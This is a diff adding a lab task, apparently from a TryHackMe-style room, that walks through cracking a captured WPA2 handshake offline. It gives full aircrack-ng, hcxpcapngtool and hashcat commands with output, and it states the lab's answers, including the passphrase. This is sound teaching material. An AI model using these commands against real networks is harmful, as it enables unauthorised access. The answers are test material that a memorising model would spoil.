@@ -428,3 +428,120 @@ Stop the capture with Ctrl+C. The file required is home2g-01.cap.
 **What short phrase does airodump-ng display in the top-right of its header once the handshake has been captured?**  
 *Answer:* WPA handshake
 
+## Task 6: Cracking the Handshake  
+
+home2g-01.cap contains a complete four-way handshake, but not the passphrase. Nowhere in the four EAPOL frames is the passphrase present. What the handshake provides is a means of testing a guess.  
+
+Recovering the passphrase from that capture is therefore a search rather than a decode, and it runs entirely on the attacker's own hardware. Two variables decide the outcome, being whether the passphrase appears among the candidates tried and how quickly the hardware works through them. The two tools below run the same search and differ only in the file format they read and the hardware they drive.  
+
+**The Handshake Verifies, It Does Not Store**  
+
+The MIC signing message 2 is a one-way fingerprint and cannot be reversed, so recovery means running the comparison from Task 4 against every line of a wordlist until one candidate reproduces it.  
+
+<img width="2206" height="928" alt="image" src="https://github.com/user-attachments/assets/dd77130a-b463-4d14-9000-3c818fb04778" />
+
+This is why a partial handshake is useless: the cracking tool requires the nonces, the MAC addresses and at least one signed frame. The attack is entirely offline, so there is no lockout and nothing to detect, and it is embarrassingly parallel, which is why GPUs outperform CPUs at it. It cannot recover a passphrase that is never tried.  
+
+**The Role of the Wordlist**  
+
+<img width="2497" height="672" alt="image" src="https://github.com/user-attachments/assets/012e5c9f-748b-4762-9236-79d23ea04c13" />
+
+**Cracking on the CPU With aircrack-ng**  
+
+aircrack-ng is the cracking component of the aircrack-ng suite, and it runs the comparison loop above against every line of a wordlist. It requires no conversion and reads the .cap directly, which makes it the shortest route for a modest wordlist on a CPU. -w supplies the wordlist whose lines are the candidates. -b selects which access point in the capture to attack by BSSID, which matters because a capture may hold handshakes for several networks. The capture file itself is the last argument:  
+
+```console
+user@debian-thm:~$ sudo aircrack-ng -w /home/user/wordlists/wifi-passwords.txt -b F0:9F:C2:71:22:12 home2g-01.cap
+Reading packets, please wait...
+Opening home2g-01.cap
+Read 1778 packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.7 rev d3127e74
+
+      [00:00:01] 988/4808 keys tested (803.17 k/s)
+
+      Time left: 4 seconds                                      20.55%
+
+                          KEY FOUND! [ REDACTED ]
+
+
+      Master Key     : 54 15 FB 44 AC 0F BA 70 8C 25 8D E7 7F A2 08 82
+                       5F FC 06 0A 22 A6 F7 3D C3 47 2B 81 74 17 AD 06
+
+      Transient Key  : 9E 3E AC 6D B4 D5 71 11 B3 4E 86 93 E7 70 62 8D
+                       46 2E A1 F9 EF 77 84 41 99 A6 52 24 C1 58 6B 8E
+                       00 1A 99 BE 2D AF 23 29 47 CD CD 23 9E A4 4B 0A
+                       8F 06 A4 BC F3 C6 20 3D 86 92 1C 22 2D E1 6B D1
+
+      EAPOL HMAC     : 4E 27 D9 5B 5E 43 82 B9 F9 A5 CC 8C 68 1D 24 07
+```
+
+The k/s figure is the guessing rate in keys per second, so 803.17 k/s is about eight hundred candidates a second, which is what a CPU manages against WPA2 because each guess pays the deliberately slow PBKDF2 cost, adequate against a few-thousand-word list but hopeless against rockyou.txt.  
+
+**Cracking With hashcat**  
+
+hashcat is a general-purpose password recovery tool built to drive its guessing on a GPU, though this lab machine has none, so here it runs on the CPU. It expects a hash file rather than a packet capture. hcxpcapngtool, from the hcxtools package, bridges the two by reading a capture, extracting the handshake fields a cracker needs and writing them in that hash format. -o names the file those are written to, and the capture to read is given last:  
+
+```console
+user@debian-thm:~$ sudo hcxpcapngtool -o home2g.22000 home2g-01.cap
+hcxpcapngtool 7.1.0 reading from home2g-01.cap...
+
+summary capture file
+--------------------
+file name................................: home2g-01.cap
+version (pcap/cap).......................: 2.4 (very basic format without any additional information)
+duration of the dump tool (seconds)......: 35
+link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
+packets inside...........................: 1778
+ESSID (total unique).....................: 1
+BEACON (total)...........................: 1
+PROBERESPONSE (total)....................: 22
+DEAUTHENTICATION (total).................: 1536
+AUTHENTICATION (total)...................: 4
+ASSOCIATIONREQUEST (PSK).................: 1
+WPA encrypted............................: 208
+EAPOL messages (total)...................: 4
+EAPOL RSN messages.......................: 4
+EAPOL M1 messages (total)................: 1
+EAPOL M2 messages (total)................: 1
+EAPOL M3 messages (total)................: 1
+EAPOL M4 messages (total)................: 1
+EAPOL pairs (total)......................: 2
+EAPOL pairs (best).......................: 1
+EAPOL pairs written to 22000 hash file...: 1 (RC checked)
+EAPOL M32E2 (authorized - ANONCE from M3): 1
+...
+```
+
+All four message types and one EAPOL pair confirm the handshake is intact. The ... stands for several advisory paragraphs the tool prints afterwards, which note that .cap is a limited format, that the radiotap header is absent and that the capture held a great many deauthentication frames. None of them prevents the hash being written, and the line that matters is the one reporting it was. -m declares which hash type hashcat is being handed, since the same file would otherwise be meaningless to it, and 22000 is the mode for WPA/WPA2, formally WPA-PBKDF2-PMKID+EAPOL. Older references mention mode 2500, which 22000 supersedes. The hash file and then the wordlist follow as the two positional arguments:  
+
+```console
+user@debian-thm:~$ hashcat -m 22000 home2g.22000 /home/user/wordlists/wifi-passwords.txt
+user@debian-thm:~$ hashcat -m 22000 home2g.22000 --show
+2535db255556981bfda5f70445239873:f09fc2712212:286c076ff943:Home-2G:REDACTED
+```
+
+hashcat records every hash it cracks in a potfile and will not crack the same hash twice, so the result is read back rather than taken from the run itself. --show looks the hash up in that potfile and prints the stored line. The line gives the Message Integrity Code from the captured handshake, followed by the BSSID, the client's MAC address, the network name and the passphrase. Both routes converge on the same passphrase for Home-2G.  
+
+**Why This Passphrase Fell**  
+
+PBKDF2 performed as designed, which is why the guessing rate is measured in thousands rather than billions per second. What failed was the choice of passphrase, a dictionary word with a digit appended, which is a pattern near the top of rockyou.txt. A long, random passphrase subjected to the same attack would not be found. A captured handshake is not a guaranteed compromise but a guaranteed offline guessing opportunity.  
+
+**Answer the questions below**  
+
+*What is the hashcat hash-mode number used to crack a WPA/WPA2 handshake?*  
+*Answer:* 22000
+
+*What is the recovered passphrase for the Home-2G network?*
+*Answer:* starwars1
+
+
+
+
+
+
+
+
+
